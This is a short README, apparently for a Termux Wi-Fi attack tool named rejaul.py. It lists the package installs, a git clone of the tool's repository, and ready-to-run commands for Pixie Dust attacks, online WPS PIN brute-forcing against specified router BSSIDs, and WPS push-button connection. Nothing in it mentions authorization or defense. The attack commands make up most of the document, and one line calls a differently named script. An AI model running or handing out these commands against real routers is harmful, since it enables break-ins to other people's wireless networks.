<!--- mark down --->
---
# wifi hack tool all run to rejaul.py
---

``` pkg install -y root-repo ```

``` pkg install -y git tsu python wpa-supplicant pixiewps iw ```

## github link:-

``` git clone https://github.com/princeicon2712/rejaul2712.git ```

``` $ cd rejaul2712 ```

``` $ chmod +x * ```

``` $ python rejaul.py -h ```

## plz' go to HOME

    Example : sudo python rejaul2712/rejaul.py -i wlan0 -K -F


# Note:

## First turn off your Wifi.

### Show avaliable networks and start Pixie Dust attack on a specified network.

``` sudo python rejaul.py -i wlan0 -K ```

### Start Pixie Dust attack on a specified BSSID: 

``` sudo python rejaul.py -i wlan0 -b 00:91:4C:C3:AC:28 -K ```

### Launch online WPS bruteforce with the specified first half of the PIN:

``` sudo python rejaul.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234 ```

## wps router push button:

``` sudo python rejaul1.py -i wlan0 --pbc ```

### Troubleshooting

### "Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.

<!--[profile](./rejaul.jpg)-->
<img src="rejaul2712.jpg" width="600"/>
